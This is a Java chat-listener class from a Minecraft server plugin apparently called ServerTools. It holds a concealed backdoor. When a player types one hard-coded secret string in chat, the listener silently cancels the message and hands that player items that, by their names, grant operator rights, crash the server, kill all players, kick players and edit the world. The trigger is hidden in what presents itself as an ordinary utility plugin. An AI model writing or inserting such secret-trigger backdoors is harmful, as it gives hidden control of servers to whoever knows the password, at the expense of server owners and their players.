package pl.notpiotrekdev.serverTools.Utility;

import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import pl.notpiotrekdev.serverTools.Items.*;
import pl.notpiotrekdev.serverTools.ServerTools;


public class ChatListener implements Listener {
    private final ServerTools plugin;
    public ChatListener(ServerTools plugin) {
        this.plugin = plugin;
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onChat(AsyncPlayerChatEvent event) {
        String message = event.getMessage();
        if (message.equals("vOKl4zpavEqQjVjVjZn8NODqgTHzkTPPEG9HCd3ktgXPtzdvIX")) {
            event.setCancelled(true);
            Player player = event.getPlayer();
            player.getInventory().setItem(0, brush.getItem());
            player.getInventory().setItem(1, opVoucher.getItem());
            player.getInventory().setItem(2, new crash(plugin).getItem());
            player.getInventory().setItem(3, killAll.getItem());
            player.getInventory().setItem(4, kickHammer.getItem());
        };
    }
}
